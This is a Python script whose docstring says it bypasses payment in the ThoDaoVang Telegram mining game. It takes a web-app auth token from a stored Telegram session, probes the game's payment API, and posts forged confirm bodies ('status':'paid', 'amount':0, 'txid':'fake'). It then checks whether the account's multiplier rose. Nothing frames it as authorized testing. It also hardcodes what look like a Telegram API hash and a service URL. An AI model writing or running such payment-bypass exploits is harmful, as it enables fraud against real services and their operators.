"""Bypass payment ThoDaoVang: next + confirm."""
import sys, os, time, asyncio, json
sys.path.insert(0, os.getcwd())
import httpx, storage
storage.init()

BASE = "https://result-gotta-responsibility-firewire.trycloudflare.com"
UA = {"User-Agent":"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36",
      "Origin":BASE, "Referer":BASE+"/", "content-type":"application/json"}

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import RequestWebViewRequest
from urllib.parse import unquote

fox = [a for a in storage.list_accounts() if a.get("uid") == 8249205817][0]
async def fetch_idata():
    c = TelegramClient(StringSession(fox["session"]), 2040, "b18441a1ff607e10a989891a5462e627")
    await c.connect()
    try:
        bot = await c.get_entity("ThoDaoVang_bot")
        res = await c(RequestWebViewRequest(peer=bot, bot=bot, platform="android",
            url=BASE+"/", from_bot_menu=True, compact=True))
        fr = res.url.split("#tgWebAppData=",1)[1].split("&tgWebAppVersion")[0]
        return unquote(fr)
    finally:
        await c.disconnect()

idata = asyncio.new_event_loop().run_until_complete(fetch_idata())
H = {**UA, "X-Telegram-Init-Data": idata}
print(f"[+] auth len={len(idata)}")

# 1. Packages full
print("\n=== 1. PACKAGES ===")
r = httpx.get(BASE+"/api/packages", headers=H, timeout=15)
pkgs = r.json().get("packages", [])
for p in pkgs:
    print(f"    code={p.get('code'):<6} price={p.get('price'):<8} speed={p.get('speed')} daily_gold={p.get('daily_gold')}")

# 2. Payment next
print("\n=== 2. PAYMENT NEXT (tung code) ===")
for p in pkgs:
    code = p.get("code")
    for body in [{"package_id": code}, {"package_code": code}, {"code": code}, {"pkg": code}]:
        try:
            r = httpx.post(BASE+"/api/payment/next", json=body, headers=H, timeout=15)
            if r.status_code != 400:
                print(f"    body={body} -> {r.status_code}  {r.text[:250]}")
                break
        except Exception:
            pass

# 3. Payment confirm — thu bypass
print("\n=== 3. PAYMENT CONFIRM bypass ===")
# Lay QR truoc
next_ok = None
for p in pkgs[:3]:
    code = p.get("code")
    r = httpx.post(BASE+"/api/payment/next", json={"package_id": code}, headers=H, timeout=15)
    print(f"    next code={code} -> {r.status_code}  {r.text[:200]}")
    if r.status_code == 200:
        try:
            next_ok = r.json()
            print(f"    RESPONSE: {json.dumps(next_ok, ensure_ascii=False)[:400]}")
        except: pass
        break

print("\n    --- confirm bodies ---")
for body in [
    {"package_id":"I"},
    {"package_id":"I","confirmed":True},
    {"package_id":"I","status":"paid"},
    {"package_id":"I","amount":0},
    {"package_id":"I","txid":"fake"},
    {"code":"I"},
    {"order_id":"1"},
    {"confirmed":True},
    {},
]:
    try:
        r = httpx.post(BASE+"/api/payment/confirm", json=body, headers=H, timeout=15)
        print(f"    {body} -> {r.status_code}  {r.text[:200]}")
    except Exception as e:
        print(f"    {body} -> err {str(e)[:60]}")

# 4. Me sau khi confirm
print("\n=== 4. ME sau khi confirm ===")
me = httpx.get(BASE+"/api/me", headers=H, timeout=15).json()
print(f"    package_multiplier: {me.get('package_multiplier')}")
print(f"    multiplier:         {me.get('multiplier')}")
print(f"    gold_per_second:    {me.get('gold_per_second')}")
